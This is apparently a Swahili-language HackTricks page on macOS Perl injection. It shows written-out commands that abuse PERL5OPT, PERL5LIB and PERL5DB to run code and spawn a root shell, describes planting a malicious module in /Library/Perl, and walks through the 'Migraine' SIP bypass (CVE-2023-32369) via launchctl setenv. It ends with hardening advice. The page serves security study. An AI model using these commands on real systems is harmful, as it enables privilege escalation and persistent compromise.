# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via `PERL5OPT` & `PERL5LIB` env variable

Kwa kutumia variable ya mazingira **`PERL5OPT`** inawezekana kufanya **Perl** itekeleze amri zisizo za kawaida wakati mfasiri anaanza (hata **kabla** ya mstari wa kwanza wa script ya lengo kuchambuliwa).
Kwa mfano, tengeneza script hii:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Sasa **export the env variable** na uendeleze **perl** script:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Chaguo lingine ni kuunda moduli ya Perl (mfano `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Na kisha tumia mabadiliko ya mazingira ili moduli ipatikane na kupakiwa kiotomatiki:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Mengine mengine ya kuvutia

* **`PERL5DB`** – wakati mfasiri anapoanzishwa na bendera **`-d`** (debugger), maudhui ya `PERL5DB` yanatekelezwa kama msimbo wa Perl *ndani ya* muktadha wa debugger. 
Ikiwa unaweza kuathiri mazingira **na** bendera za amri za mchakato wa Perl wenye mamlaka, unaweza kufanya kitu kama:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # itatoa shell kabla ya kutekeleza script
```

* **`PERL5SHELL`** – kwenye Windows, variable hii inasimamia ni executable ipi ya shell ambayo Perl itatumia inapohitajika kuanzisha shell. Inatajwa hapa tu kwa ukamilifu, kwani si muhimu kwenye macOS.

Ingawa `PERL5DB` inahitaji swichi `-d`, ni kawaida kukutana na scripts za matengenezo au installer ambazo zinafanywa kama *root* na bendera hii imewezeshwa kwa ajili ya kutatua matatizo kwa kina, na kufanya variable hii kuwa njia halali ya kupandisha mamlaka.

## Kupitia utegemezi (@INC abuse)

Inawezekana kuorodhesha njia ya kujumuisha ambayo Perl itatafuta (**`@INC`**) kwa kukimbia:
```bash
perl -e 'print join("\n", @INC)'
```
Matokeo ya kawaida kwenye macOS 13/14 yanaonekana kama:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Baadhi ya folda zilizorejeshwa hata hazipo, hata hivyo **`/Library/Perl/5.30`** ipo, *siyo* iliyo na ulinzi wa SIP na *iko* kabla ya folda zilizo na ulinzi wa SIP. Hivyo, ikiwa unaweza kuandika kama *root* unaweza kuweka moduli mbaya (mfano `File/Basename.pm`) ambayo itakuwa *kipaumbele* kupakuliwa na script yoyote yenye mamlaka inayoiingiza moduli hiyo.

> [!WARNING]
> Bado unahitaji **root** kuandika ndani ya `/Library/Perl` na macOS itaonyesha kiashiria cha **TCC** kinachouliza kwa *Upatikanaji wa Disk Kamili* kwa mchakato unaofanya operesheni ya kuandika.

Kwa mfano, ikiwa script inatumia **`use File::Basename;`** itakuwa inawezekana kuunda `/Library/Perl/5.30/File/Basename.pm` inayokuwa na msimbo unaodhibitiwa na mshambuliaji.

## SIP bypass kupitia Msaada wa Uhamiaji (CVE-2023-32369 “Migraine”)

Mnamo Mei 2023 Microsoft ilifunua **CVE-2023-32369**, iliyopewa jina la **Migraine**, mbinu ya baada ya unyakuzi inayomruhusu mshambuliaji wa *root* **kuzidi kabisa Ulinzi wa Uhakika wa Mfumo (SIP)**. 
Sehemu iliyo hatarini ni **`systemmigrationd`**, daemon iliyopewa haki ya **`com.apple.rootless.install.heritable`**. Mchakato wowote wa mtoto unaozalishwa na daemon hii unapata haki hiyo na hivyo unafanya kazi **nje** ya vizuizi vya SIP.

Kati ya watoto walioainishwa na watafiti ni mfasiri aliyetia saini na Apple:
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Kwa sababu Perl inaheshimu `PERL5OPT` (na Bash inaheshimu `BASH_ENV`), kuharibu *mazingira* ya daemon kunatosha kupata utekelezaji wa kiholela katika muktadha usio na SIP:
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Wakati `migrateLocalKDC` inafanya kazi, `/usr/bin/perl` inaanza na `PERL5OPT` mbaya na inatekeleza `/private/tmp/migraine.sh` *kabla ya SIP kurejeshwa*. Kutoka kwenye script hiyo unaweza, kwa mfano, nakala ya payload ndani ya **`/System/Library/LaunchDaemons`** au kupewa sifa ya ziada `com.apple.rootless` ili kufanya faili **isiweze kufutwa**.

Apple ilirekebisha tatizo katika macOS **Ventura 13.4**, **Monterey 12.6.6** na **Big Sur 11.7.7**, lakini mifumo ya zamani au isiyo na patch bado inabaki kuwa na hatari.

## Mapendekezo ya kuimarisha

1. **Futa mabadiliko hatari** – launchdaemons au kazi za cron zenye mamlaka zinapaswa kuanza na mazingira safi (`launchctl unsetenv PERL5OPT`, `env -i`, nk.).
2. **Epuka kuendesha waandishi kama root** isipokuwa ni lazima. Tumia binaries zilizokusanywa au punguza mamlaka mapema.
3. **Scripts za muuzaji zikiwa na `-T` (hali ya uchafu)** ili Perl ipuuzie `PERL5OPT` na swichi nyingine zisizo salama wakati ukaguzi wa uchafu umewezeshwa.
4. **Hifadhi macOS kuwa wa kisasa** – “Migraine” imepatikana kikamilifu katika toleo la sasa.

## Marejeleo

- Microsoft Security Blog – “Uthibitisho mpya wa macOS, Migraine, unaweza kupita Ulinzi wa Uhakika wa Mfumo” (CVE-2023-32369), Mei 30 2023.
- Hackyboiz – “Utafiti wa Kupita SIP ya macOS (PERL5OPT & BASH_ENV)”, Mei 2025.

{{#include ../../../banners/hacktricks-training.md}}
